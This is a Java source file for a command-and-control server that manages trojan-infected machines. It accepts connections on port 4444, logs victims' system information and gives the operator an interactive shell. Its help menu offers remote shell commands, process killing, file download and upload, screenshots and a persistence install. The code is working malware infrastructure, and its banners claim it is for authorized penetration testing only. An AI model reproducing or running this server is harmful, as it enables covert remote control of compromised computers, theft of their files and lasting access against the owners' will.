import java.io.*;
import java.net.*;
import java.util.*;
import java.text.SimpleDateFormat;
import java.util.concurrent.CopyOnWriteArrayList;

/**
 * ═══════════════════════════════════════════════════════════════════════════════
 * COMMAND & CONTROL (C2) SERVER - JAVA VERSION
 * ═══════════════════════════════════════════════════════════════════════════════
 * 
 * ⚠️  FOR AUTHORIZED PENETRATION TESTING ONLY
 * 
 * This C2 server:
 * 1. Listens for trojan connections
 * 2. Receives system information from infected machines
 * 3. Sends commands to trojan clients
 * 4. Manages file transfers (upload/download)
 * 5. Maintains connection with multiple clients
 * 6. Logs all activities
 * 
 * ═══════════════════════════════════════════════════════════════════════════════
 */

public class C2Server {
    
    // ═══════════════════════════════════════════════════════════════════════════
    // CONFIGURATION
    // ═══════════════════════════════════════════════════════════════════════════
    
    private static final String C2_HOST = "0.0.0.0";              // Listen on all interfaces
    private static final int C2_PORT = 4444;                      // C2 listening port
    private static final int MAX_CLIENTS = 10;                    // Maximum concurrent connections
    private static final int CHUNK_SIZE = 4096;                   // File transfer chunk size
    private static final String LOG_FILE = "c2_activity.log";     // Activity log
    
    // ═══════════════════════════════════════════════════════════════════════════
    // MEMBER VARIABLES
    // ═══════════════════════════════════════════════════════════════════════════
    
    private ServerSocket serverSocket;
    private List<ClientHandler> clients = new CopyOnWriteArrayList<>();
    private int clientCounter = 0;
    
    // ═══════════════════════════════════════════════════════════════════════════
    // LOGGING SYSTEM
    // ═══════════════════════════════════════════════════════════════════════════
    
    /**
     * Log all C2 activities for forensics
     */
    public static void log(String message, String level) {
        String timestamp = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date());
        String logEntry = "[" + timestamp + "] [" + level + "] " + message;
        
        System.out.println(logEntry);
        
        try {
            FileWriter fw = new FileWriter(LOG_FILE, true);
            fw.write(logEntry + "\n");
            fw.close();
        } catch (IOException e) {
            System.err.println("Error writing to log file: " + e.getMessage());
        }
    }
    
    // ═══════════════════════════════════════════════════════════════════════════
    // CLIENT HANDLER
    // ═══════════════════════════════════════════════════════════════════════════
    
    /**
     * Handle individual trojan client connection
     */
    private class ClientHandler extends Thread {
        private Socket clientSocket;
        private InetAddress clientAddress;
        private int clientId;
        private PrintWriter out;
        private BufferedReader in;
        private boolean connected = true;
        private String systemInfo = "";
        
        public ClientHandler(Socket clientSocket, int clientId) throws IOException {
            this.clientSocket = clientSocket;
            this.clientAddress = clientSocket.getInetAddress();
            this.clientId = clientId;
            this.out = new PrintWriter(clientSocket.getOutputStream(), true);
            this.in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));
            
            log("[CLIENT " + clientId + "] New connection from " + clientAddress.getHostAddress(),
                "CONNECTION");
        }
        
        /**
         * Receive initial system information from trojan
         */
        public boolean receiveInitialInfo() {
            try {
                String infoline = in.readLine();
                if (infoline != null) {
                    systemInfo = infoline;
                    log("[CLIENT " + clientId + "] System Info:\n" + infoline, "INFO");
                    return true;
                }
            } catch (IOException e) {
                log("[CLIENT " + clientId + "] Error receiving initial info: " + e.getMessage(),
                    "ERROR");
            }
            return false;
        }
        
        /**
         * Send command to trojan client
         */
        public synchronized void sendCommand(String command) {
            try {
                if (connected && clientSocket != null && !clientSocket.isClosed()) {
                    out.println(command);
                    out.flush();
                    log("[CLIENT " + clientId + "] Sent command: " + command.split(":")[0], "COMMAND");
                }
            } catch (Exception e) {
                log("[CLIENT " + clientId + "] Error sending command: " + e.getMessage(), "ERROR");
                connected = false;
            }
        }
        
        /**
         * Receive command execution result from trojan
         */
        public String receiveResponse() {
            try {
                clientSocket.setSoTimeout(5000);
                return in.readLine();
            } catch (SocketTimeoutException e) {
                return null;
            } catch (IOException e) {
                log("[CLIENT " + clientId + "] Error receiving response: " + e.getMessage(), "ERROR");
                connected = false;
                return null;
            }
        }
        
        /**
         * Interactive command shell for trojan client
         */
        public void interactiveShell() {
            System.out.println("\n[*] Connected to client " + clientId);
            System.out.println("[*] Type 'help' for available commands");
            System.out.println("[*] Type 'exit' to disconnect\n");
            
            BufferedReader userInput = new BufferedReader(new InputStreamReader(System.in));
            
            while (connected) {
                try {
                    System.out.print("[CLIENT " + clientId + "]> ");
                    String input = userInput.readLine();
                    
                    if (input == null || input.isEmpty()) {
                        continue;
                    }
                    
                    // Parse input
                    String[] parts = input.split(" ", 2);
                    String command = parts[0];
                    String args = parts.length > 1 ? parts[1] : "";
                    
                    // Help command
                    if (command.equals("help")) {
                        showHelp();
                        continue;
                    }
                    
                    // Exit command
                    if (command.equals("exit")) {
                        sendCommand("exit:");
                        connected = false;
                        log("[CLIENT " + clientId + "] Session terminated", "DISCONNECT");
                        break;
                    }
                    
                    // Build command string
                    String fullCommand = command + ":" + args;
                    
                    // Send command to trojan
                    sendCommand(fullCommand);
                    
                    // Receive response
                    String response = receiveResponse();
                    if (response != null) {
                        System.out.println(response);
                    }
                    
                } catch (IOException e) {
                    System.out.println("[-] Error: " + e.getMessage());
                    connected = false;
                }
            }
        }
        
        /**
         * Display available commands
         */
        private void showHelp() {
            String helpText = "\n" +
                "════════════════════════════════════════════════════════════════\n" +
                "AVAILABLE COMMANDS\n" +
                "════════════════════════════════════════════════════════════════\n" +
                "\n" +
                "INFORMATION GATHERING:\n" +
                "  sysinfo                     - Get target system information\n" +
                "  processes                   - List running processes\n" +
                "  list_files <directory>      - List files in directory\n" +
                "\n" +
                "COMMAND EXECUTION:\n" +
                "  shell <command>             - Execute shell command\n" +
                "  start <command>             - Start a process\n" +
                "  kill <process_name>         - Terminate process by name\n" +
                "\n" +
                "FILE OPERATIONS:\n" +
                "  download <remote_path>      - Download file from target\n" +
                "  upload <local_path> <remote_path> - Upload file to target\n" +
                "\n" +
                "SURVEILLANCE:\n" +
                "  screenshot                  - Capture screen (Windows only)\n" +
                "\n" +
                "PERSISTENCE:\n" +
                "  persist                     - Install persistence mechanism\n" +
                "\n" +
                "SESSION:\n" +
                "  help                        - Show this help menu\n" +
                "  exit                        - Close connection to client\n" +
                "\n" +
                "════════════════════════════════════════════════════════════════\n";
            System.out.println(helpText);
        }
        
        /**
         * Run client handler thread
         */
        @Override
        public void run() {
            if (receiveInitialInfo()) {
                interactiveShell();
            } else {
                log("[CLIENT " + clientId + "] Failed to receive initial info", "ERROR");
            }
            
            try {
                if (clientSocket != null && !clientSocket.isClosed()) {
                    clientSocket.close();
                }
            } catch (IOException e) {
                // Ignore
            }
            
            clients.remove(this);
            log("[CLIENT " + clientId + "] Connection closed", "INFO");
        }
    }
    
    // ═══════════════════════════════════════════════════════════════════════════
    // C2 SERVER
    // ═══════════════════════════════════════════════════════════════════════════
    
    /**
     * Start C2 server and listen for connections
     */
    public void start() {
        try {
            serverSocket = new ServerSocket(C2_PORT);
            
            log("C2 Server started on " + C2_HOST + ":" + C2_PORT, "START");
            
            System.out.println(
                "╔════════════════════════════════════════════════════════════╗\n" +
                "║     COMMAND & CONTROL SERVER - PENETRATION TESTING        ║\n" +
                "║                                                            ║\n" +
                "║  Server: " + C2_HOST + ":" + C2_PORT + "                              \n" +
                "║  Status: LISTENING FOR CONNECTIONS                        ║\n" +
                "║                                                            ║\n" +
                "║  ⚠️  FOR AUTHORIZED TESTING ONLY ⚠️                       ║\n" +
                "╚════════════════════════════════════════════════════════════╝\n"
            );
            
            // Accept connections loop
            while (true) {
                Socket clientSocket = serverSocket.accept();
                clientCounter++;
                int currentClientId = clientCounter;
                
                log("New connection from " + clientSocket.getInetAddress().getHostAddress() +
                    ":" + clientSocket.getPort() + " (ID: " + currentClientId + ")",
                    "CONNECTION");
                
                // Handle client in separate thread
                ClientHandler handler = new ClientHandler(clientSocket, currentClientId);
                clients.add(handler);
                handler.start();
            }
            
        } catch (IOException e) {
            log("Error starting C2 server: " + e.getMessage(), "ERROR");
            System.exit(1);
        }
    }
    
    /**
     * Main entry point
     */
    public static void main(String[] args) {
        System.out.println(
            "╔════════════════════════════════════════════════════════════╗\n" +
            "║           C2 SERVER - INITIALIZATION                       ║\n" +
            "║                                                            ║\n" +
            "║  ⚠️  FOR AUTHORIZED PENETRATION TESTING ONLY ⚠️           ║\n" +
            "║  ⚠️  UNAUTHORIZED USE IS ILLEGAL ⚠️                       ║\n" +
            "║                                                            ║\n" +
            "║  This tool is designed for security professionals to:     ║\n" +
            "║  - Test antivirus detection capabilities                 ║\n" +
            "║  - Validate defensive security measures                  ║\n" +
            "║  - Conduct authorized penetration tests                  ║\n" +
            "║                                                            ║\n" +
            "╚════════════════════════════════════════════════════════════╝\n"
        );
        
        // Create downloads and screenshots directories
        new File("downloads").mkdir();
        new File("screenshots").mkdir();
        
        // Start C2 server
        C2Server server = new C2Server();
        server.start();
    }
}
